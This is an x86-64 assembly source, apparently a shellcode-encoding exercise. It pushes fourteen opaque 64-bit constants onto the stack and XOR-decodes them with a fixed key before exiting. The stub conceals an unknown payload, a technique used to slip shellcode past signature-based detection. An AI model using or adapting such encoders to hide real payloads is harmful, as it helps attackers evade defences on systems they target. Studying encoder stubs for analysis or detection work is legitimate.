global _start


section .text
_start:
    mov rax,0xa284ee5c7cde4bd7
    push   rax
    mov rax,0x935add110510849a
    push   rax
    mov rax,0x10b29a9dab697500
    push   rax
    mov rax,0x200ce3eb0d96459a
    push   rax
    mov rax,0xe64c30e305108462
    push   rax
    mov rax,0x69cd355c7c3e0c51
    push   rax
    mov rax,0x65659a2584a185d6
    push   rax
    mov rax,0x69ff00506c6c5000
    push   rax
    mov rax,0x3127e434aa505681
    push   rax
    mov rax,0x6af2a5571e69ff48
    push   rax
    mov rax,0x6d179aaff20709e6
    push   rax
    mov rax,0x9ae3f152315bf1c9
    push   rax
    mov rax,0x373ab4bb0900179a
    push   rax
    mov rax,0x69751244059aa2a3
    ; 14 * 8 bytes was pushed onto the stock
    push   rax
    mov rbx,0x2144d2144d2144d2
    mov rcx, 0
_loop:
    xor [rsp + rcx*8], rbx
    inc rcx
    cmp rcx, 14
    jl _loop

Exit:
    mov rax, 60
    mov rdi, 0
    syscall